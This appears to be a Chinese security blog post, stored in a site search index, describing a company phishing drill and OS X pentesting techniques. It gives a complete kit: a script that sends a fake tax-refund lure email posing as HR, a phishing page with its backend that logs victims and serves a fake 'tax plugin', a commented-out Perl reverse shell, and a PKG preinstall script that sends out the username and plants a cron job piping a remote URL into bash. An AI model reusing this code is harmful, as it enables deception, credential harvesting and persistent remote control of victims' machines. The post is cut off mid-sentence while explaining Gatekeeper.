<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>记一次钓鱼演练和OS X下的渗透技巧</title>
      <link href="/2023/03/27/pinfish-and-osx-pentest.html"/>
      <url>/2023/03/27/pinfish-and-osx-pentest.html</url>
      
        <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>一年一度的钓鱼节，需要针对公司员工做一次钓鱼演练，前期准备工作如下:</p><ul><li>确定钓鱼的页面：图方便选了一个登录入口，用Chrome插件SingleFile右键一键保存</li><li>确定钓鱼的形式：引导用户输入公司邮箱，点击完成之后，弹出需要安装插件，根据UA决定是下载pkg还是exe。</li><li>确定钓鱼的效果：从三个数据维度来看最终效果<ul><li>钓鱼页面访问次数</li><li>输入公司邮箱的数量统计</li><li>收集运行了Exe和Pkg的用户</li></ul></li></ul><h2 id="钓鱼邮件的发送"><a href="#钓鱼邮件的发送" class="headerlink" title="钓鱼邮件的发送"></a>钓鱼邮件的发送</h2><p>有两种形式可以发送钓鱼邮件：</p><ol><li>使用相近域名</li><li>使用sendcloud</li></ol><h3 id="相近域名发送"><a href="#相近域名发送" class="headerlink" title="相近域名发送"></a>相近域名发送</h3><p>注册相近域名之后，可以根据这里的步骤绑定使用zoho的免费企业邮箱: <a href="https://zhuanlan.zhihu.com/p/341879374">2021年四款国内外免费企业邮箱及申请教程图解</a></p><h3 id="使用SendCloud"><a href="#使用SendCloud" class="headerlink" title="使用SendCloud"></a>使用SendCloud</h3><p>注册SendCloud之后，生成API Key，利用以下代码发送钓鱼邮件：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token punctuation">,</span> jsonurl<span class="token operator">=</span><span class="token string">"http://api.sendcloud.net/apiv2/mail/send"</span>body <span class="token operator">=</span> <span class="token triple-quoted-string string">"""    &lt;br>    各位同事:&lt;br>    &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;根据《关于延续实施全年一次性奖金等个人所得税优惠政策的公告》（财政部税务总局2023年第4号公告），全年一次性奖金单独计税优惠政策，执行期限延长至2023年4月14日。为确保广大职工充分享受该项税收优惠政策，2022年底税务总局对每一名职工的全年工薪收入和各类扣除情况进行了分析测算，按政策将大部分职工年底发放的部分绩效结算金额按全年一次性奖金优化计税。优化后，有78.2%的职工可节约税金。在2023年4月中旬申报期完成全年一次性奖金纳税申报后，后续会按程序将节约的税金发至职工账户上，申报操作流程，请据此跳转税务申报平台: &lt;a href='https://example.com/'>税务申报平台&lt;a>&lt;br>需要说明：经过对职工全年应缴税额和已扣税额对比，部分职工需要补税，补税的金额将在后续发放的绩效中扣除。相关政策职工可通过此链接&lt;a href='http://www.chinatax.gov.cn'>http://www.chinatax.gov.cn/&lt;/a>查看。"""</span>receives <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'john@victim.com'</span><span class="token punctuation">]</span><span class="token comment"># 您需要登录SendCloud创建API_USER，使用API_USER和API_KEY才可以进行邮件的发送。</span>params <span class="token operator">=</span> <span class="token punctuation">&#123;</span>  <span class="token string">"apiUser"</span><span class="token punctuation">:</span> <span class="token string">"&lt;Users>"</span><span class="token punctuation">,</span> \  <span class="token string">"apiKey"</span> <span class="token punctuation">:</span> <span class="token string">"&lt;apikey>"</span><span class="token punctuation">,</span>\  <span class="token string">"from"</span> <span class="token punctuation">:</span> <span class="token string">"hr@example.com"</span><span class="token punctuation">,</span> \  <span class="token string">"fromName"</span> <span class="token punctuation">:</span> <span class="token string">"hr@example.com"</span><span class="token punctuation">,</span> \  <span class="token string">"to"</span> <span class="token punctuation">:</span> <span class="token string">"&lt;helo@victim.com>"</span><span class="token punctuation">,</span> \  <span class="token string">"subject"</span> <span class="token punctuation">:</span> <span class="token string">"【重要】关于2023年个人所得税税收优化"</span><span class="token punctuation">,</span> \  <span class="token string">"html"</span><span class="token punctuation">:</span> body<span class="token punctuation">,</span> \<span class="token punctuation">&#125;</span>r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> files<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> data<span class="token operator">=</span>params<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="钓鱼的页面"><a href="#钓鱼的页面" class="headerlink" title="钓鱼的页面"></a>钓鱼的页面</h2><p>对输入的信息进行后端提交，输入完成之后弹框提示用户下载插件，js代码如下：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>link href<span class="token operator">=</span><span class="token string">"https://cdn.jsdelivr.net/npm/@sweetalert2/theme-bulma@4/bulma.css"</span> rel<span class="token operator">=</span><span class="token string">"stylesheet"</span><span class="token operator">></span><span class="token operator">&lt;</span>script src<span class="token operator">=</span><span class="token string">"https://cdn.jsdelivr.net/npm/sweetalert2@11/dist/sweetalert2.min.js"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span>    <span class="token keyword">function</span> <span class="token function">isValidEmail</span><span class="token punctuation">(</span><span class="token parameter">email</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">var</span> reg <span class="token operator">=</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">^[a-zA-Z0-9_\.-]+@[a-zA-Z0-9_-]+(\.[a-zA-Z0-9_-]+)+$</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">;</span>        <span class="token keyword">return</span> reg<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>email<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">isChinese</span><span class="token punctuation">(</span><span class="token parameter">str</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">var</span> reg <span class="token operator">=</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">^[\u4E00-\u9FA5]+$</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">;</span>        <span class="token keyword">return</span> reg<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">login_submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">var</span> usernameInput <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">var</span> emailInput <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'password'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isChinese</span><span class="token punctuation">(</span>usernameInput<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            Swal<span class="token punctuation">.</span><span class="token function">fire</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>            <span class="token literal-property property">icon</span><span class="token operator">:</span> <span class="token string">'error'</span><span class="token punctuation">,</span>            <span class="token literal-property property">title</span><span class="token operator">:</span> <span class="token string">'Oops...'</span><span class="token punctuation">,</span>            <span class="token literal-property property">text</span><span class="token operator">:</span> <span class="token string">'请输入中文公司名称'</span><span class="token punctuation">,</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isValidEmail</span><span class="token punctuation">(</span>emailInput<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            Swal<span class="token punctuation">.</span><span class="token function">fire</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>            <span class="token literal-property property">icon</span><span class="token operator">:</span> <span class="token string">'error'</span><span class="token punctuation">,</span>            <span class="token literal-property property">title</span><span class="token operator">:</span> <span class="token string">'Oops...'</span><span class="token punctuation">,</span>            <span class="token literal-property property">text</span><span class="token operator">:</span> <span class="token string">'请输入正确的邮箱地址!'</span><span class="token punctuation">,</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isChinese</span><span class="token punctuation">(</span>usernameInput<span class="token punctuation">.</span>value<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isValidEmail</span><span class="token punctuation">(</span>emailInput<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                            <span class="token keyword">const</span> corpname <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value<span class="token punctuation">;</span>                <span class="token keyword">const</span> email <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'password'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value<span class="token punctuation">;</span>                <span class="token keyword">var</span> formData <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FormData</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                formData<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"corpname"</span><span class="token punctuation">,</span> corpname<span class="token punctuation">)</span><span class="token punctuation">;</span>                formData<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"email"</span><span class="token punctuation">,</span> email<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">var</span> http <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">var</span> url <span class="token operator">=</span> <span class="token string">'/login'</span><span class="token punctuation">;</span>                http<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'POST'</span><span class="token punctuation">,</span> url<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                http<span class="token punctuation">.</span><span class="token function">setRequestHeader</span><span class="token punctuation">(</span><span class="token string">'Content-type'</span><span class="token punctuation">,</span> <span class="token string">'application/x-www-form-urlencoded'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                http<span class="token punctuation">.</span><span class="token function-variable function">onreadystatechange</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">//Call a function when the state changes.</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>http<span class="token punctuation">.</span>readyState <span class="token operator">==</span> <span class="token number">4</span> <span class="token operator">&amp;&amp;</span> http<span class="token punctuation">.</span>status <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                                                       <span class="token keyword">if</span> <span class="token punctuation">(</span>navigator<span class="token punctuation">.</span>platform<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">'Win'</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                            Swal<span class="token punctuation">.</span><span class="token function">fire</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>                            <span class="token literal-property property">title</span><span class="token operator">:</span> <span class="token string">'提交成功!'</span><span class="token punctuation">,</span>                            <span class="token literal-property property">showCloseButton</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>                            <span class="token literal-property property">focusConfirm</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>                            <span class="token literal-property property">html</span><span class="token operator">:</span> <span class="token string">'晚些会向您发送邮件通知，请安装税务系统插件: &lt;a href="https://example.com/download/win">点击下载&lt;/a> '</span><span class="token punctuation">,</span>                            <span class="token literal-property property">icon</span><span class="token operator">:</span> <span class="token string">'success'</span>                            <span class="token punctuation">&#125;</span>                            <span class="token punctuation">)</span><span class="token punctuation">;</span>                                                    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>navigator<span class="token punctuation">.</span>platform<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">'Mac'</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                            Swal<span class="token punctuation">.</span><span class="token function">fire</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>                            <span class="token literal-property property">title</span><span class="token operator">:</span> <span class="token string">'提交成功!'</span><span class="token punctuation">,</span>                            <span class="token literal-property property">showCloseButton</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>                            <span class="token literal-property property">focusConfirm</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>                            <span class="token literal-property property">html</span><span class="token operator">:</span> <span class="token string">'晚些会向您发送邮件通知，请安装税务系统插件: &lt;a href="https://example.com/download/osx">点击下载&lt;/a> '</span><span class="token punctuation">,</span>                            <span class="token literal-property property">icon</span><span class="token operator">:</span> <span class="token string">'success'</span>                            <span class="token punctuation">&#125;</span>                            <span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token punctuation">&#125;</span>                                           <span class="token punctuation">&#125;</span>                <span class="token punctuation">&#125;</span>                http<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">URLSearchParams</span><span class="token punctuation">(</span>formData<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>     <span class="token punctuation">&#125;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="后端代码"><a href="#后端代码" class="headerlink" title="后端代码"></a>后端代码</h2><p>后端需要收集用户提交的表单信息，如果运行了EXE或者PKG需要把用户的信息上传到服务端，整体代码如下:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># coding: utf-8</span><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> request<span class="token punctuation">,</span> send_file<span class="token keyword">from</span> flask_cors <span class="token keyword">import</span> CORS<span class="token keyword">import</span> sqlite3<span class="token keyword">import</span> timeapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">init_db</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    CONN <span class="token operator">=</span> sqlite3<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token string">'fish.db'</span><span class="token punctuation">)</span>    CURSOR <span class="token operator">=</span> CONN<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span>    CURSOR<span class="token punctuation">.</span>execute<span class="token punctuation">(</span>        <span class="token triple-quoted-string string">"""        CREATE TABLE IF NOT EXISTS users (                id INTEGER PRIMARY KEY AUTOINCREMENT,                corpname TEXT NOT NULL,                email TEXT NOT NULL,                createdate DATETIME DEFAULT (DATETIME('now','localtime'))            );        """</span>    <span class="token punctuation">)</span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>    CURSOR<span class="token punctuation">.</span>execute<span class="token punctuation">(</span>        <span class="token triple-quoted-string string">"""        CREATE TABLE IF NOT EXISTS osx (                id INTEGER PRIMARY KEY AUTOINCREMENT,                osxname TEXT NOT NULL,                createdate DATETIME DEFAULT (DATETIME('now','localtime'))            )        """</span>    <span class="token punctuation">)</span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>    CURSOR<span class="token punctuation">.</span>execute<span class="token punctuation">(</span>        <span class="token triple-quoted-string string">"""        CREATE TABLE IF NOT EXISTS win (                id INTEGER PRIMARY KEY AUTOINCREMENT,                pcname TEXT NOT NULL,                username TEXT NOT NULL,                createdate DATETIME DEFAULT (DATETIME('now','localtime'))            )        """</span>    <span class="token punctuation">)</span><span class="token comment"># 收集表单数据</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    corpname <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'corpname'</span><span class="token punctuation">]</span>    email <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'email'</span><span class="token punctuation">]</span>    <span class="token keyword">with</span> sqlite3<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token string">"fish.db"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> conn<span class="token punctuation">:</span>        cur <span class="token operator">=</span> conn<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span>        cur<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"INSERT  INTO users(corpname, email) VALUES (?, ?)"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>corpname<span class="token punctuation">,</span> email<span class="token punctuation">)</span><span class="token punctuation">)</span>        conn<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token string">"Success"</span><span class="token comment"># 运行Exe之后收集用户名和pcname，定位员工</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/windata'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">windata</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    username <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span>    pcname <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'pcname'</span><span class="token punctuation">]</span>    <span class="token keyword">with</span> sqlite3<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token string">"fish.db"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> conn<span class="token punctuation">:</span>        cur <span class="token operator">=</span> conn<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span>        cur<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"INSERT INTO win(username, pcname) VALUES (?,?)"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>username<span class="token punctuation">,</span> pcname<span class="token punctuation">)</span><span class="token punctuation">)</span>        conn<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token string">"Success"</span><span class="token comment"># 运行了pkg的会新建一个定时任务后门，请求这个URL</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/osxdoor'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">osx</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment">#return "perl -e 'use Socket;$i=\"&lt;ip>\";$p=10000;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,\">&amp;S\");open(STDOUT,\">&amp;S\");open(STDERR,\">&amp;S\");exec(\"sh -i\");&#125;;' "</span>    <span class="token keyword">return</span> <span class="token string">"echo 'helo world'"</span><span class="token comment"># 运行PKG之后，收集用户名，定位员工</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/osxdata'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">osxdata</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    user <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span>    <span class="token keyword">with</span> sqlite3<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token string">"fish.db"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> conn<span class="token punctuation">:</span>        cur <span class="token operator">=</span> conn<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span>        cur<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"INSERT  INTO osx(osxname) VALUES (?)"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>user<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        conn<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token string">"Success"</span><span class="token comment"># 下载插件功能</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/download/&lt;plat>'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">download</span><span class="token punctuation">(</span>plat<span class="token punctuation">)</span><span class="token punctuation">:</span>    headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">'Content-Disposition'</span><span class="token punctuation">:</span> <span class="token string">'attachment; filename=税务申报插件.zip'</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> plat <span class="token operator">==</span> <span class="token string">"osx"</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> send_file<span class="token punctuation">(</span><span class="token string">"fishbin/finace.pkg"</span><span class="token punctuation">,</span> as_attachment<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> download_name<span class="token operator">=</span><span class="token string">"税务申报插件.zip"</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> plat <span class="token operator">==</span> <span class="token string">"sh"</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> send_file<span class="token punctuation">(</span><span class="token string">"fishbin/install.sh"</span><span class="token punctuation">,</span> as_attachment<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> download_name<span class="token operator">=</span><span class="token string">"税务申报插件.zip"</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> plat <span class="token operator">==</span> <span class="token string">"zip"</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> send_file<span class="token punctuation">(</span><span class="token string">"fishbin/osx.zip"</span><span class="token punctuation">,</span> as_attachment<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> download_name<span class="token operator">=</span><span class="token string">"税务申报插件.zip"</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> send_file<span class="token punctuation">(</span><span class="token string">"fishbin/win.zip"</span><span class="token punctuation">,</span> as_attachment<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> download_name<span class="token operator">=</span><span class="token string">"税务申报插件.zip"</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    init_db<span class="token punctuation">(</span><span class="token punctuation">)</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">5000</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="OS-X的钓鱼实践"><a href="#OS-X的钓鱼实践" class="headerlink" title="OS X的钓鱼实践"></a>OS X的钓鱼实践</h2><p>OS X在实际测试碰到几个问题：</p><ul><li>比如OS X应该用什么木马平台</li><li>PKG安装的时候是以root权限运行的，怎么获取登录的用户名</li><li>为啥root反弹的pkg不能查看普通用户的桌面（此处是因为TCC机制）</li></ul><h3 id="OS-X的恶意PKG"><a href="#OS-X的恶意PKG" class="headerlink" title="OS X的恶意PKG"></a>OS X的恶意PKG</h3><p>PKG的制作最简单的可以参考<a href="https://www.cnblogs.com/strengthen/p/15933420.html">这篇文章</a>，使用<a href="http://s.sudre.free.fr/Software/Packages/about.html">Packages</a>，利用preinstall脚本，脚本的代码如下:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token assign-left variable"><span class="token environment constant">USER</span></span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span>dscacheutil -q group -a name admin<span class="token operator">|</span><span class="token function">grep</span> <span class="token function">users</span><span class="token operator">|</span><span class="token function">cut</span> -d <span class="token string">" "</span> -f <span class="token number">3</span><span class="token variable">)</span></span><span class="token function">curl</span> -XPOST https://example.com/osxdata -d <span class="token string">"user=<span class="token environment constant">$USER</span>"</span><span class="token function">crontab</span> -l <span class="token operator">></span> /private/tmp/you_have_been_pwn.txt<span class="token builtin class-name">echo</span> <span class="token string">"*/5 * * * * curl -sSL https://example.com/osxdoor | bash"</span> <span class="token operator">>></span> /tmp/you_have_been_pwn.txt<span class="token function">crontab</span> /private/tmp/you_have_been_pwn.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>root用户获取普通用户名的方式: <code>USER=$(dscacheutil -q group -a name admin|grep users|cut -d &quot; &quot; -f 3)</code></p><h3 id="OS-X下的渗透测试攻击"><a href="#OS-X下的渗透测试攻击" class="headerlink" title="OS X下的渗透测试攻击"></a>OS X下的渗透测试攻击</h3><p>参考下面这几个文章:</p><ul><li><a href="https://mp.weixin.qq.com/s/MVb1x-jsSAHu-Bn1sjDXAQ">国护准备之macos攻击</a></li><li><a href="https://mp.weixin.qq.com/s/CwqE0AgpzbUqdmg4R57_zA">MacOS钓鱼实践</a></li><li><a href="https://blog.macoder.tech/macOS-6faf0534323c42259f5277bd95d35c43">打造macOS下最强的微信取证工具</a></li></ul><p>OSX系统下载一个文件到运行的时候，中间会碰到这几个安全拦截:</p><h4 id="Gatekeeper"><a href="#Gatekeeper" class="headerlink" title="Gatekeeper"></a>Gatekeeper</h4><p>Gatekeeper 是一种安全机制，旨在仅允许受信任的应用程序在系统上运行，类似于Windows上的SmartScreen和MOTW。从Internet下载可执行文件时，它们会标有属性com.apple.quarantine，该属性会在文件运行时触发网守。如果可执行文件未经过公证，Gatekeeper 将向用户显示提示，通知他们该文件无法运行，因为它未签名。要运行未签名的可执行文件，用户必须右键单击该文件，然后单击打开，而不是双击。</p><p>在验证代码签名后，macOS的内置防病毒软件XProtect将扫描文件中的恶意软件。XProtect使用YARA规则。</p><p>最后，如果您想要对应用程序进行公证，您可以注册Apple Developer 